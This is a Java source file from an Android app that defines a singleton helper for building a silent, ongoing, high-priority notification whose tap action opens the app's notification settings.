package com.icontrol.protector;

import static com.icontrol.protector.UtliTools.resizeIcon;

import android.app.NotificationManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.Drawable;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import android.widget.RemoteViews;

import androidx.core.app.NotificationCompat;

public class MyNotification {
    private static MyNotification instance;
    private static String channelId = "updates";
    private static String title = "";
    private NotificationManager notificationManager;
    private MyNotification(Context context) {
        notificationManager = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
    }
    public static MyNotification getInstance(Context context) {
        if (instance == null) {
            instance = new MyNotification(context);
        }
        return instance;
    }
//    public static Bitmap createBlankBitmap(int width, int height) {
//        Bitmap bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
//        Canvas canvas = new Canvas(bitmap);
//        canvas.drawColor(Color.WHITE); // Fill with white color, change as needed
//        return bitmap;
//    }

    public static Intent goToNotificationSettings(String channelId, Context context) {
        Intent intent = new Intent();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            // For Android 8.0 (API 26) and above
            if (channelId != null) {
                intent.setAction(Settings.ACTION_CHANNEL_NOTIFICATION_SETTINGS);
                intent.putExtra(Settings.EXTRA_APP_PACKAGE, context.getPackageName());
                intent.putExtra(Settings.EXTRA_CHANNEL_ID, channelId);
            } else {
                intent.setAction(Settings.ACTION_APP_NOTIFICATION_SETTINGS);
                intent.putExtra(Settings.EXTRA_APP_PACKAGE, context.getPackageName());
            }
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            // For Android 7.0 (API 24) and 7.1 (API 25)
            intent.setAction(Settings.ACTION_APP_NOTIFICATION_SETTINGS);
            intent.putExtra(Settings.EXTRA_APP_PACKAGE, context.getPackageName());
        } else {
            // For Android 5.0 (API 21) to Android 6.0 (API 23)
            intent.setAction("android.settings.APP_NOTIFICATION_SETTINGS");
            intent.putExtra("app_package", context.getPackageName());
            intent.putExtra("app_uid", context.getApplicationInfo().uid);
        }

        // Ensure the intent can be handled before starting the activity
        if (intent.resolveActivity(context.getPackageManager()) != null) {
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            return intent;
        } else {
            // Fallback to the app's detail settings if the specific intent action is not available
            Intent fallbackIntent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            fallbackIntent.setData(Uri.parse("package:" + context.getPackageName()));
            fallbackIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            return fallbackIntent;
        }
    }

    public Notification createNotification(Context context) {


        //Intent fullScreenIntent = new Intent(context,tofront.class);
        Intent fullScreenIntent = goToNotificationSettings(channelId,context);

        fullScreenIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK );
        PendingIntent fullScreenPendingIntent = PendingIntent.getActivity(context, 0,
                fullScreenIntent, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);



        NotificationCompat.Builder builder =null;

        builder = new NotificationCompat.Builder(context, channelId)
                .setContentTitle(My_Configs._Notfy_TITL_)
                .setContentText(My_Configs._Notfy_MSG_)
                .setSmallIcon(R.drawable.notify)
                .setContentIntent(fullScreenPendingIntent)
                .setOngoing(true)
                .setSilent(true)
                .setShowWhen(false)
                .setCategory(NotificationCompat.CATEGORY_CALL)
                .setOnlyAlertOnce(true)
                .setVisibility(NotificationCompat.VISIBILITY_PUBLIC)
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .setAutoCancel(false);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            // Only use full-screen intent on older Android if needed
            builder.setFullScreenIntent(fullScreenPendingIntent, false); // or remove it entirely
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {

            NotificationChannel channel = new NotificationChannel(channelId, "update", NotificationManager.IMPORTANCE_HIGH);

            channel.setDescription(My_Configs._Notfy_MSG_);
            channel.setShowBadge(false);
            notificationManager.createNotificationChannel(channel);
            //channel.canBypassDnd();
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                channel.setAllowBubbles(false);
            }

            channel.setLockscreenVisibility(Notification.VISIBILITY_PUBLIC);
            channel.setSound(null,null);

            builder.setOngoing(true);
        }

        builder.setSound(null);

        return builder.build();
    }
}
